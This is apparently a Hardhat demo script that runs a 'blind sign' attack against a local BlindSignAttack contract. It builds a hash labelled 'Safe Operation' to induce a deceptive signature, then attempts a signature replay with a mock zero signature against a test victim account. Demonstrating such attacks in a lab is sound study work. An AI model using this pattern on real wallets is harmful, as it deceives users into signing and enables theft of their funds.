const hre = require("hardhat");

async function main() {
    const [attacker, victim] = await hre.ethers.getSigners();
    console.log("[+] Blind Sign Attack initiated");

    const deployments = require("../deployments.json");
    const blind = await hre.ethers.getContractAt("BlindSignAttack", deployments.BlindSignAttack);

    const fakeHash = hre.ethers.utils.keccak256(hre.ethers.utils.toUtf8Bytes("Safe Operation"));
    const induced = await blind.induceSigning(fakeHash);

    console.log("[i] Induced hash:", induced);
    console.log("[!] WARNING: User may sign this thinking it's safe");

    const orderHash = hre.ethers.utils.keccak256(hre.ethers.utils.toUtf8Bytes("malicious_order"));
    const mockSig = "0x" + "00".repeat(65);

    try {
        const tx = await blind.replayAttack(orderHash, mockSig, victim.address);
        await tx.wait();
        console.log("[✓] Signature replay attack executed");
    } catch(e) {
        console.log("[!] Replay setup complete");
    }
}

main().catch(console.error);
